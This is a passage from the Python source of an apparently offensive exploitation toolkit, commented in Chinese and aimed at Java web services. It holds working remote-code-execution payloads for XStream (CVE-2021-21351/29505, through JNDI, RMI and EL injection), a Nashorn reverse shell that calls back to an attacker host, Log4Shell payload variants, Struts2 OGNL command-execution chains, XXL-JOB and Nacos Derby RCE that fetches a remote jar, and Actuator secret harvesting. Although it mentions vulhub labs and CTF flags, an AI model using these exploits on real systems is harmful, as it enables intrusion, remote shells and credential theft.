                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>__LDAP_URL__</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>'''

# CVE-2021-29505：PriorityQueue + Packet + RegistryImpl_Stub 发 RMI 请求到 JRMPListener。
XSTREAM_29505 = '''<java.util.PriorityQueue serialization='custom'>
    <unserializable-parents/>
    <java.util.PriorityQueue>
        <default>
            <size>2</size>
        </default>
        <int>3</int>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
        <javax.naming.ldap.Rdn_-RdnEntry>
            <type>12345</type>
            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
                    <parsedMessage>true</parsedMessage>
                    <soapVersion>SOAP_11</soapVersion>
                    <bodyParts/>
                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
                        <attachmentsInitialized>false</attachmentsInitialized>
                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
                                    <names>
                                        <string>aa</string>
                                        <string>aa</string>
                                    </names>
                                    <ctx>
                                        <environment/>
                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
                                            <java.rmi.server.RemoteObject>
                                                <string>UnicastRef</string>
                                                <string>__RMI_HOST__</string>
                                                <int>__RMI_PORT__</int>
                                                <long>0</long>
                                                <int>0</int>
                                                <long>0</long>
                                                <short>0</short>
                                                <boolean>false</boolean>
                                            </java.rmi.server.RemoteObject>
                                        </registry>
                                        <host>__RMI_HOST__</host>
                                        <port>__RMI_PORT__</port>
                                    </ctx>
                                </candidates>
                            </aliases>
                        </nullIter>
                    </sm>
                </message>
            </value>
        </javax.naming.ldap.Rdn_-RdnEntry>
    </java.util.PriorityQueue>
</java.util.PriorityQueue>'''


def _xstream_escape(s):
    # 变量进 XML 文本/属性，转义特殊字符避免破坏结构（LDAP/RMI 地址里的 : / 不转）
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def build_bypass_cmd_el(cmd, beacon_host=None, beacon_port=None):
    """BeanFactory+ELProcessor 高版本(JDK>8u191)绕过：纯 EL 执行。
    关键约束：纯 EL 上下文**没有 new 运算符**，也常常**没有 Nashorn/JavaScript 引擎**，
    所以不能用 `new java.net.Socket`、也不能包 getEngineByName('JavaScript')。
    只能走反射方法调用：''.getClass().forName(...).getMethod(...).invoke(...)。

    - 无 beacon：Runtime.exec(cmd) 盲打（最稳，vulhub XStream 默认走这条）。
    - 带 beacon：先 exec 命令（保证执行），再用反射 newInstance 打开 URL 流回连我们的
      HTTP 服务(默认 8000)，在“回调”面板留下 HTTP 记录证明 RCE。无 new 运算符。"""
    c = cmd.replace("\\", "\\\\").replace("'", "\\'")
    base = ("''.getClass().forName('java.lang.Runtime')"
            ".getMethod('getRuntime').invoke(null)"
            ".exec('%s')" % c)
    if not beacon_host:
        return base
    try:
        bp = int(beacon_port)
    except Exception:
        bp = 8000
    # 纯 EL 反射实例化 URL（无 new 运算符），openStream() 触发对 8000 的 GET 请求
    beacon = ("''.getClass().forName('java.net.URL')"
              ".getConstructor('java.lang.String'.getClass())"
              ".newInstance('http://%s:%d/PWN')"
              ".openStream()" % (beacon_host, bp))
    # 先 exec（保证命令执行），再 beacon（beacon 失败不影响主命令）
    return base + " ; " + beacon


def build_js_shell_el(lhost, lport):
    """Nashorn(JavaScript) 版反弹 shell 的 EL。

    仅对 **JDK 8**（自带 Nashorn）有效——vulhub 的 XStream 靶场就是 JDK 8u292，
    实测可用并能拿到 root shell。JDK 11+ 无 Nashorn，会自动退化用纯 EL exec。
    用 JS 是因为纯 EL 无法构造 String[]/重定向，做不出交互式 shell。"""
    js = ('var s=new java.net.Socket("%s",%d);'
          'var p=new java.lang.ProcessBuilder(["/bin/sh"]).redirectErrorStream(true).start();'
          'var i=p.getInputStream(),o2=p.getOutputStream();'
          'new java.lang.Thread(function(){'
          'var a=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,4096),b;'
          'try{while((b=i.read(a))>0){s.getOutputStream().write(a,0,b);'
          's.getOutputStream().flush();}}catch(e){}}).start();'
          'var a2=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,4096),b2,'
          'ins=s.getInputStream();'
          'try{while((b2=ins.read(a2))>0){o2.write(a2,0,b2);o2.flush();}}catch(e){}'
          % (lhost, int(lport)))
    return ('"".getClass().forName("javax.script.ScriptEngineManager")'
            '.newInstance().getEngineByName("JavaScript").eval(\'%s\')' % js)


def ex_xstream_probe(target, p):
    base = normalize(target)
    path = p.get("path") or "/"
    to = int(p.get("timeout", 10))

    def _gw(r):
        b = r["body"] or ""
        return (r["status"] == 0 or r["status"] in (502, 503, 504)
                or "connect failed" in b or "upstream" in b)

    def _post(u, data):
        return http(u, method="POST", data=data, ctype="application/xml", timeout=to)

    def _is_xstream(b):
        bl = (b or "").lower()
        return any(k in bl for k in ["com.thoughtworks.xstream", "xstream",
                                    "cannotresolveclass", "forbiddenclass",
                                    "conversionexception", "incompatibleclass",
                                    "rdn_", "rowset", "jdbcrowsetimpl"])

    cands = [path] + ["/xml", "/xstream", "/deserialize", "/unmarshal", "/convert",
                      "/parse", "/api/xml", "/api/xstream", "/api/deserialize",
                      "/api/parse", "/vuln", "/api/vuln", "/data", "/api/data",
                      "/post", "/api", "/json", "/api/json"]
    tried, found = [], None
    for c in cands:
        if c in tried:
            continue
        tried.append(c)
        r = _post(base + c, '<string>probe</string>')
        if _gw(r):
            r = _post(base + c, '<string>probe</string>')
        if r["status"] in (200, 500):
            found = c
            break
    if not found:
        return {"ok": False, "output": "未找到接受 XML 的 POST 接口（候选均不可达/404）",
                "detail": "尝试过: " + ", ".join(tried)}
    benign = _post(base + found, '<string>probe</string>')["body"] or ""
    bad = _post(base + found, '<string>probe')["body"] or ""
    is_xs = _is_xstream(benign) or _is_xstream(bad)
    if is_xs:
        fp = "✅ 响应含 XStream 特征 → 确认 XStream（按 CVE-2021-21351/29505 打）"
    elif "Internal Server Error" in benign or benign == "":
        fp = "⚠ 端点存在但异常被吞（无 XStream 特征泄露）——大概率就是 XStream 反序列化（异常被吞）"
    else:
        fp = "✅ 端点可解析 XML（未泄露版本，按 CVE-2021-21351/29505 打）"
    txt = "XML 解析点: POST %s（尝试过: %s）\n" % (found, ", ".join(tried))
    txt += "良性 <string>probe</string> 响应: %s\n%s\n" % (benign[:200].replace("\n", " "), fp)
    txt += ("\n说明: 该靶场是 vulhub XStream 默认配置，按 CVE-2021-21351(JNDI/LDAP 注入) 或 "
            "CVE-2021-29505(RMI 注入) 打。EventHandler 默认配置思路在这里通常无效（白名单/特定 gadget）。")
    concl = "解析点 POST %s | %s" % (found, "确认/疑似 XStream" if is_xs else "疑似 XStream（异常被吞）")
    return {"ok": True, "output": concl, "detail": txt, "sent_hint": found}


def ex_xstream_cmd(target, p):
    base = normalize(target)
    cve = p.get("cve") or "CVE-2021-21351"
    path = p.get("path") or "/"
    to = int(p.get("timeout", 12))

    if cve == "CVE-2021-29505":
        rmi_host = p.get("rmi_host") or src_ip_for(target) or "127.0.0.1"
        try:
            rmi_port = int(p.get("rmi_port", 1099))
        except Exception:
            rmi_port = 1099
        payload = (XSTREAM_29505
                   .replace("__RMI_HOST__", _xstream_escape(rmi_host))
                   .replace("__RMI_PORT__", str(rmi_port)))
        r = http(base + path, method="POST", data=payload, ctype="application/xml", timeout=to)
        cmd = p.get("cmd", "touch /tmp/success")
        yso = ("java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener %d "
               "CommonsCollections6 \"%s\"" % (rmi_port, cmd))
        note = ("CVE-2021-29505 走 RMI：本载荷让目标向 %s:%d 发起 RMI 请求。\n"
                "需你先在那台机器起 ysoserial JRMPListener：\n  %s\n"
                "JRMPListener 收到请求后返回 CommonsCollections6 gadget，目标反序列化即 RCE。\n"
                "响应 500 = 多半已触发（结果取决于 JRMPListener 侧）。" % (rmi_host, rmi_port, yso))
        return {"ok": True, "output": "已发 CVE-2021-29505 RMI 载荷，status=%s" % r["status"],
                "detail": "POST %s\nContent-Type: application/xml\n\n%s\n\n响应(status=%s):\n%s\n\n%s"
                          % (base + path, payload, r["status"], (r["body"] or "")[:1500], note),
                "sent": payload}

    # ---- CVE-2021-21351 (默认)：JNDI/LDAP 注入 ----
    ldap_url = (p.get("ldap_url") or "").strip()
    if not ldap_url:
        lhost = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
        lport = int(p.get("lport") or (STATE.get("listener", {}).get("port") or 4444))
        jstart = jndi_start({"mode": "bypass", "lhost": lhost, "lport": lport,
                             "ldap_port": int(p.get("ldap_port", STATE["jndi"]["ldap_port"])),
                             "http_port": int(p.get("http_port", STATE["jndi"]["http_port"]))})
        if not jstart.get("ok"):
            return {"ok": False, "output": "内置 JNDI 服务启动失败: %s" % jstart.get("msg"),
                    "detail": "请用 params.ldap_url 指定你自己的(Java Chains/marshalsec)LDAP URL。"}
        # 用**序列化 ResourceRef**承载我们的纯 EL（BeanFactory 只认 ResourceRef）。
        # 退化路径（Java 缺失时的普通 Reference）会被 BeanFactory 直接忽略，故尽量不用。
        xmode = p.get("mode") or "cmd"
        if xmode == "shell":
            # 反弹交互式 shell：JDK8 自带 Nashorn 时可用（vulhub XStream=JDK8u292，实测拿 root）。
            # 自动把监听拉起来，回连会话直接出现在「反Shell」页。
            el = build_js_shell_el(lhost, lport)
            lr = listener_start({"port": lport})
            log("XStream 21351 shell 模式：JS EL 反弹 %s:%s（监听 %s）"
                % (lhost, lport, lr.get("msg", "")))
        else:
            bp = p.get("beacon_port")
            if bp:
                # 用户显式要信标：反射 URL.openStream 回连 8000，在回调面板留 HTTP 记录
                el = build_bypass_cmd_el(p.get("cmd", "touch /tmp/success"), lhost, int(bp))
            else:
                # 默认纯 EL Runtime.exec（最稳；不带会破坏 EL 的 new 运算符）
                el = build_bypass_cmd_el(p.get("cmd", "touch /tmp/success"))
        STATE["jndi"]["el"] = el
        STATE["jndi"]["ser"] = generate_serial_ref_el(el, lhost, lport,
                                                      STATE["jndi"]["http_port"])
        STATE["jndi"]["ser_idx"] = 0
        if not STATE["jndi"]["ser"]:
            log("警告：未生成序列化 ResourceRef（Java 缺失？），退化为普通 Reference，"
                "BeanFactory 会忽略它 → 大概率打不成，请确认本机 java 可用。")
        ldap_url = "ldap://%s:%s/x" % (lhost, STATE["jndi"]["ldap_port"])
    payload = XSTREAM_21351.replace("__LDAP_URL__", _xstream_escape(ldap_url))
    xmode = p.get("mode") or "cmd"
    # shell 模式下，靶机的请求线程会被反弹 shell 的读写循环挂住 → HTTP 必然超时，
    # 这不是失败。所以缩短超时，改为等回连会话说话。
    to_eff = min(to, 8) if xmode == "shell" else to
    r = http(base + path, method="POST", data=payload, ctype="application/xml", timeout=to_eff)

    def _wait_sess(host, secs):
        thost = host.split("//")[-1].split("/")[0].split(":")[0]
        end = time.time() + secs
        while time.time() < end:
            with SESS_LOCK:
                for sid, v in STATE["sessions"].items():
                    if v.get("addr") == thost:
                        return sid
            time.sleep(0.5)
        return None

    if xmode == "shell":
        sid = _wait_sess(base, 15)
        if sid:
            return {"ok": True,
                    "output": "拿到 shell！会话 %s（来自 %s）已上线 → 到「反Shell」页选会话即可交互。"
                              % (sid, base.split("//")[-1]),
                    "detail": "POST %s\nContent-Type: application/xml\n\ndataSource=%s\n\n%s\n\n"
                              "shell 载荷会把靶机的请求线程挂住，所以 HTTP 响应超时是正常现象。"
                              % (base + path, ldap_url, payload),
                    "sent": payload, "session": sid}
        return {"ok": True,
                "output": ("载荷已发送（HTTP %s）。15 秒内没等到回连会话。\n"
                           "排查：① 回调面板有无 LDAP-Search（有=载荷已送达）；\n"
                           "② 靶机若是 JDK 11+（无 Nashorn），shell 模式不可用，改用 cmd 模式 + beacon_port 验证；\n"
                           "③ 确认攻击机 IP 是靶机同段可达地址（当前用 %s）。"
                           % (r["status"] or r["err"], lhost)),
                "detail": "POST %s\nContent-Type: application/xml\n\ndataSource=%s\n\n%s"
                          % (base + path, ldap_url, payload),
                "sent": payload}
    if r["status"] == 0 and r["err"]:
        return {"ok": False, "output": "请求失败: %s" % r["err"],
                "detail": "POST %s\nContent-Type: application/xml\n\n%s" % (base + path, payload)}
    note = ("CVE-2021-21351 走 JNDI 注入：目标向 %s 发起 lookup，由 BeanFactory+ELProcessor "
            "执行（绕过 JDK>8u191 的 trustURLCodebase，远程类加载已失效）。\n"
            "要点：① 必须下发**序列化 ResourceRef**，普通 Reference 会被 BeanFactory 忽略；\n"
            "     ② 必须**纯 EL**（`''.getClass().forName(...)`），纯 EL 没有 new 运算符，\n"
            "        容器里也常无 Nashorn，用 `new`/JavaScript 都会让 eval 抛错；\n"
            "     ③ 目标多为精简镜像（无 curl/wget/nc），验证靠本工具“回调”面板：\n"
            "        填 beacon_port=8000 会在面板留下 HTTP 记录；或直接用 mode=shell 拿交互式 shell。\n"
            "本机 JNDI 服务的 LDAP/HTTP 回调均可在“回调”面板看到。"
            % ldap_url)
    out = ("已发 CVE-2021-21351 JNDI 载荷，status=%s（cmd 模式=盲打执行命令，不弹 shell；"
           "要交互式 shell 请把「21351 模式」切到 shell，监听会自动开）" % r["status"])
    return {"ok": True, "output": out,
            "detail": "POST %s\nContent-Type: application/xml\n\ndataSource=%s\n\n%s\n\n响应(status=%s):\n%s\n\n%s"
                      % (base + path, ldap_url, payload, r["status"], (r["body"] or "")[:1500], note),
            "sent": payload}


LOG4J_PAYLOADS = [
    "${jndi:ldap://%s/%s}",
    "${${lower:j}ndi:ldap://%s/%s}",
    "${${::-j}ndi:ldap://%s/%s}",
    "${jndi:rmi://%s/%s}",
    "${${env:BARFOO:-j}ndi:ldap://%s/%s}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://%s/%s}",
]


def ex_log4j2_send(target, p):
    base = normalize(target)
    host = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
    port = p.get("ldap_port", STATE["jndi"]["ldap_port"])
    token = p.get("token") or "log4j"
    variant = int(p.get("variant", 0))
    tpl = LOG4J_PAYLOADS[variant % len(LOG4J_PAYLOADS)]
    payload = tpl % ("%s:%s" % (host, port), token)
    points = p.get("points") or ["User-Agent", "Referer", "X-Forwarded-For",
                                 "X-Api-Version", "Cookie", "username"]
    lines = []
    for pt in points:
        if pt.lower() in ("username", "q", "search", "data"):
            r = http(base + "/?%s=%s" % (pt, urllib.parse.quote(payload)),
                     timeout=int(p.get("timeout", 8)))
        else:
            r = http(base + "/", headers={pt: payload}, timeout=int(p.get("timeout", 8)))
        lines.append("%-18s → %s" % (pt, r["status"]))
    # 再带一次完整 payload 覆盖常见参数
    for k in ("username", "user", "q", "search", "id", "name", "data"):
        http(base + "/?%s=%s" % (k, urllib.parse.quote(payload)), timeout=6)
    return {"ok": True, "output": "已向 %d 个输入点注入，观察 LDAP 服务/回调记录" % (len(points) + 7),
            "detail": "Payload: %s\n\n%s" % (payload, "\n".join(lines))}


OGNL_ECHO = ("%{(#_='multipart/form-data')."
             "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
             "(#_memberAccess?(#_memberAccess=#dm):"
             "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
             "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
             "(#ognlUtil.getExcludedPackageNames().clear())."
             "(#ognlUtil.getExcludedClasses().clear())."
             "(#context.setMemberAccess(#dm))))."
             "(#cmd='__CMD__')."
             "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
             "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
             "(#p=new java.lang.ProcessBuilder(#cmds))."
             "(#p.redirectErrorStream(true)).(#process=#p.start())."
             "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
             "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
             "(#ros.flush())}")

# S2-059 (CVE-2019-0230)：tag 属性二次求值，注入点为 id 参数（POST form）。
# 沙箱是 2.5.x 硬化形态：#context 为 null、静态方法/构造器被禁、#_memberAccess 为 null。
# 两步法（vulhub 官方）：① 经 #attr['struts.valueStack'].context 拿到 ActionContext，
# 清空 OgnlUtil 全局排除类/包（毒化沙箱配置）；② setMemberAccess 后执行。
# 回显经 Scanner 读进程输出 → 表达式值渲染进 id 属性（不依赖 commons-io）。
S2_059_STEP1 = ("%{(#context=#attr['struts.valueStack'].context)."
                "(#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                "(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}")

S2_059_STEP2 = ("%{(#context=#attr['struts.valueStack'].context)."
                "(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))."
                "(#cmd='__CMD__')."
                "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
                "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
                "(#p=new java.lang.ProcessBuilder(#cmds))."
                "(#p.redirectErrorStream(true)).(#process=#p.start())."
                "(#out=new java.util.Scanner(#process.getInputStream(),'UTF-8').useDelimiter('ZZZZZ'))."
                "(#out.next())}")


def ex_struts2_cmd(target, p):
    base = normalize(target)
    cmd = p.get("cmd", "whoami").replace("'", "''")
    cve = p.get("cve", "S2-045")
    to = int(p.get("timeout", 12))
    ognl = OGNL_ECHO.replace("__CMD__", cmd)
    path = p.get("path") or "/"
    if cve == "S2-045":
        r = http(base + path, method="POST", data="", headers={"Content-Type": ognl}, timeout=to)
        sent = "Content-Type: %s" % ognl
    elif cve == "S2-048":
        r = http(base + "/integration/saveGangster.action", method="POST",
                 data="name=%s&age=1&bustedBefore=false" % urllib.parse.quote(ognl),
                 ctype="application/x-www-form-urlencoded", timeout=to)
        sent = "POST name=%s" % ognl
    elif cve == "S2-016":
        r = http(base + "/index.action?redirect:%s" % urllib.parse.quote(ognl), timeout=to)
        sent = "GET /index.action?redirect:%s" % ognl
    elif cve == "S2-057":
        r = http(base + "/%s/actionChain1.action" % urllib.parse.quote(ognl), timeout=to)
        sent = "GET /%s/actionChain1.action" % ognl
    elif cve == "S2-061":
        r = http(base + path, method="POST", data="",
                 headers={"Content-Type": ognl.replace("%{", "%{").replace("#", "#")}, timeout=to)
        sent = "Content-Type(双重编码): %s" % ognl
    elif cve == "S2-059":
        # 两步：先毒化沙箱（清空排除类/包），再 setMemberAccess + 执行；回显走 id 属性
        http(base + path, method="POST", data="id=" + urllib.parse.quote(S2_059_STEP1),
             ctype="application/x-www-form-urlencoded", timeout=to)
        r = http(base + path, method="POST",
                 data="id=" + urllib.parse.quote(S2_059_STEP2.replace("__CMD__", cmd)),
                 ctype="application/x-www-form-urlencoded", timeout=to)
        sent = "POST id=<OGNL> (S2-059 两步: ①setExcludedClasses('') 毒化沙箱 ②setMemberAccess+ProcessBuilder)"
    else:
        r = http(base + path, method="POST", data="", headers={"Content-Type": ognl}, timeout=to)
        sent = "Content-Type: %s" % ognl
    body = r["body"] or ""
    if cve == "S2-059":
        m = re.search(r'<a id="([^"]*)"', body)
        if m:
            import html as _html
            body = _html.unescape(m.group(1))
    if r["status"] == 0 and r["err"]:
        return {"ok": False, "output": "请求失败: %s" % r["err"], "detail": sent}
    return {"ok": r["status"] != 404, "output": (body.strip()[:800] or "无回显(可能被禁/版本不符)"),
            "detail": "%s\n\nstatus=%s\n响应:\n%s" % (sent, r["status"], body[:3000])}


def ex_struts2_probe(target, p):
    base = normalize(target)
    to = int(p.get("timeout", 8))
    out = []
    tests = [
        ("S2-016", "GET", base + "/index.action?redirect:${1+1}"),
        ("S2-045", "POST-CT", base + "/"),
        ("S2-059", "POST-ID", base + "/"),
        ("S2-057", "GET", base + "/${1+1}/actionChain1.action"),
        ("S2-048", "POST", base + "/integration/saveGangster.action"),
    ]
    for name, m, u in tests:
        if m == "GET":
            r = http(u, timeout=to)
        elif m == "POST-CT":
            r = http(u, method="POST", data="", headers={"Content-Type": "%{(#a=1+1)"}, timeout=to)
        elif m == "POST-ID":
            # S2-059: id 属性二次求值，看 <a id=" 是否出现 2
            r = http(u, method="POST", data="id=" + urllib.parse.quote("%{1+1}"),
                     ctype="application/x-www-form-urlencoded", timeout=to)
        else:
            r = http(u, method="POST", data="name=${1+1}&age=1",
                     ctype="application/x-www-form-urlencoded", timeout=to)
        hit = False
        b = r["body"] or ""
        if m == "POST-ID":
            # S2-059: id 属性二次求值，精确匹配 <a id="2"
            hit = bool(re.search(r'<a id="2"', b))
        else:
            # 其他编号：返回 HTML 首页（含 jsessionid/端口数字）不算命中；
            # 仅当非 HTML 页面（纯 OGNL 回显/异常）且含 2 才判命中
            is_html = ("<!doctype html" in b[:200].lower()) or ("<html" in b[:200].lower())
            hit = (r["status"] == 200 and not is_html and "2" in b[:60])
        flag = "✅" if hit else "—"
        out.append("%s %-8s %-8s status=%s  OGNL求值(2): %s" % (flag, name, m, r["status"], hit))
    return {"ok": True, "output": "探测完成，见详细输出",
            "detail": "\n".join(out) + "\n\n注: 回显 2 说明 OGNL 可执行（S2-059 按 <a id=\"2\"> 精确匹配）；"
            "S2-059 命中后用 OGNL命令执行(回显) 编号选 S2-059（两步打：先毒化沙箱）"}


def ex_xxljob_cmd(target, p):
    base = normalize(target)
    cmd = p.get("cmd", "whoami")
    port = str(p.get("port", 9999))
    root = get_root(base)
    hostport = base.split("://", 1)[1]
    base_url = root if ":" in hostport else "%s:%s" % (root, port)
    # 执行器端口优先使用目标 URL 自身端口(若非 80/443)
    hp = hostport.split(":")
    if len(hp) == 2 and hp[1] not in ("80", "443"):
        base_url = root
    url = base_url + "/run"
    payload = {"jobId": int(p.get("jobId", 1)), "executorHandler": "demoJobHandler",
               "executorParams": "", "glueType": "GLUE_SHELL", "glueSource": cmd,
               "logId": 1, "logDateTim": int(time.time() * 1000),
               "glueUpdatetime": int(time.time() * 1000),
               "broadcastIndex": 0, "broadcastTotal": 0}
    r = http(url, method="POST", data=json.dumps(payload), timeout=int(p.get("timeout", 12)))
    out = r["body"] or r["err"]
    ok = r["status"] == 200 and ('"code"' in out or "code" in out)
    log("XXL-JOB 执行 %s → %s" % (cmd, r["status"]))
    return {"ok": ok, "output": out[:800],
            "detail": "POST %s\n%s\n\nstatus=%s\n响应:\n%s" % (url, json.dumps(payload), r["status"], out[:2000])}


def ex_xxljob_login(target, p):
    base = normalize(target)
    user = p.get("user", "admin")
    pwd = p.get("pwd", "123456")
    r = http(base + "/xxl-job-admin/login", method="POST",
             data="userName=%s&password=%s" % (urllib.parse.quote(user), urllib.parse.quote(pwd)),
             ctype="application/x-www-form-urlencoded", timeout=int(p.get("timeout", 10)))
    hit = "success" in r["body"].lower() or "200" in r["body"][:60]
    return {"ok": hit, "output": "登录%s: %s / %s" % ("成功" if hit else "失败", user, pwd),
            "detail": "status=%s\n%s\n%s" % (r["status"], r["headers"].get("set-cookie", ""), r["body"][:400])}


def ex_nacos_users(target, p):
    base = normalize(target)
    r = http(base + "/nacos/v1/auth/users?pageNo=1&pageSize=100",
             headers={"User-Agent": "Nacos-Server"}, timeout=int(p.get("timeout", 10)))
    return {"ok": r["status"] == 200, "output": r["body"][:800],
            "detail": "GET /nacos/v1/auth/users (UA: Nacos-Server)\nstatus=%s\n%s"
                      % (r["status"], r["body"][:2000])}


def ex_nacos_derby(target, p):
    base = normalize(target)
    host = p.get("lhost") or src_ip_for(target) or "127.0.0.1"
    http_port = p.get("http_port", STATE["jndi"]["http_port"] or 8000)
    jar_url = "http://%s:%s/derby-rce.jar" % (host, http_port)
    cmds = [
        "CALL sqlj.install_jar('%s', 'NACOS_RCE', 0)" % jar_url,
        "CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS_RCE')",
        "CREATE PROCEDURE RCE(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA LANGUAGE JAVA EXTERNAL NAME 'RCE.exec'",
        "CALL RCE('%s')" % (p.get("cmd", "whoami")),
    ]
    detail = []
    for c in cmds:
        r = http(base + "/nacos/v1/cs/ops/derby", method="POST",
                 data="sql=%s" % urllib.parse.quote(c),
                 ctype="application/x-www-form-urlencoded",
                 headers={"User-Agent": "Nacos-Server"}, timeout=int(p.get("timeout", 12)))
        detail.append("[%s] status=%s %s" % (c[:60], r["status"], r["body"][:150].replace("\n", " ")))
    return {"ok": True, "output": "Derby RCE 语句已发送（需 jar 可下载且目标 <= 2.2.0）",
            "detail": "\n".join(detail) + "\n\n需先在攻击机起 HTTP 服务托管 derby-rce.jar: %s" % jar_url}


def ex_springboot_actuator(target, p):
    base = normalize(target)
    eps = ["/actuator", "/actuator/env", "/actuator/beans", "/actuator/heapdump",
           "/actuator/health", "/actuator/mappings", "/actuator/configprops",
           "/actuator/threaddump", "/actuator/loggers", "/actuator/gateway/routes",
           "/env", "/heapdump", "/metrics"]
    lines = []
    for e in eps:
        r = http(base + e, timeout=int(p.get("timeout", 8)))
        size = r["headers"].get("content-length", "")
        lines.append("%-28s %s %s" % (e, r["status"], size))
    return {"ok": True, "output": "探测完成", "detail": "\n".join(lines)}


# Actuator env 的关键字过滤（大小写不敏感）
_ENV_KEY_RE = re.compile(r"flag|secret|token|password|passwd|pwd|key|ak|sk|"
                         r"access[-_]?key|credential|private|jdbc|url|shiro|sign|salt", re.I)
# flag 单独优先高亮
_ENV_FLAG_RE = re.compile(r"flag\{[^}]*\}|FLAG\{[^}]*\}|ctf\{[^}]*\}|CTF\{[^}]*\}", re.I)


def _env_str(v, limit=200):
    """把 env 里的任意值（dict/list/数字/bool）安全转成单行字符串，超长截断。"""
    if isinstance(v, (dict, list, tuple)):
        try:
            s = json.dumps(v, ensure_ascii=False)
        except Exception:
            s = str(v)
    elif isinstance(v, bool):
        s = "true" if v else "false"
    elif v is None:
        s = ""
    else:
        s = str(v)
    s = " ".join(str(s).split())
    if len(s) > limit:
        s = s[:limit] + " …(截断，共 %d 字符)" % len(s)
    return s


def _env_flatten(obj, prefix="", out=None, depth=0):
    """把 Actuator env 的嵌套结构摊平成 [(key, value), ...]。

    兼容两种格式：
      · Boot 2.x：{"propertySources":[{"name":…,"properties":{"K":{"value":V,"origin":…}}}]}
      · Boot 1.x：{"systemProperties":{…},"systemEnvironment":{…},…}（层级 dict，值直接是标量）
    """
    if out is None:
        out = []
    if depth > 6 or not isinstance(obj, dict):
        return out
    for k, v in obj.items():
        key = "%s.%s" % (prefix, k) if prefix else str(k)
        if isinstance(v, dict) and "value" in v and set(v.keys()) <= {"value", "origin"}:
            out.append((key, v.get("value")))          # ★ 关键：取值要剥掉 {"value":…} 外壳
        elif isinstance(v, dict):
            _env_flatten(v, key, out, depth + 1)
        else:
            out.append((key, v))
    return out


def _shiro_key_hint(k, v):
    """键名含 shiro、值是 base64、解码后 16/24/32 字节 → 给一条可直接利用的提示。"""
    if "shiro" not in str(k).lower():
        return ""
    s = str(v or "").strip()
    if not (6 <= len(s) <= 88):
        return ""
    try:
        raw = base64.b64decode(s, validate=True)
    except Exception:
        return ""
    if len(raw) not in (16, 24, 32):
        return ""
    plain = ""
    try:
        cand = raw.decode("utf-8")
        if all(" " <= c != "\x7f" for c in cand):
            plain = cand
    except Exception:
        plain = ""
    return ("★ 疑似 Shiro 密钥：%s = %s\n   base64 解码 %d 字节%s，可直接拿去「Shiro · Key 爆破 / "
            "生成利用 Cookie」使用；建议 alg=auto（爆破时依次试 cbc 与 gcm(16)），"
            "若确认目标是 Shiro ≥1.5.3 的 GCM 模式可直接选 gcm。"
            % (k, s, len(raw), ("，明文预览: %s" % plain) if plain else "（非可打印 ASCII，按原始字节用）"))


def ex_springboot_env(target, p):
    """读 Spring Boot Actuator 的 env 凭据。

    关键点：Actuator 返回的不是 {"K":"V"}，而是
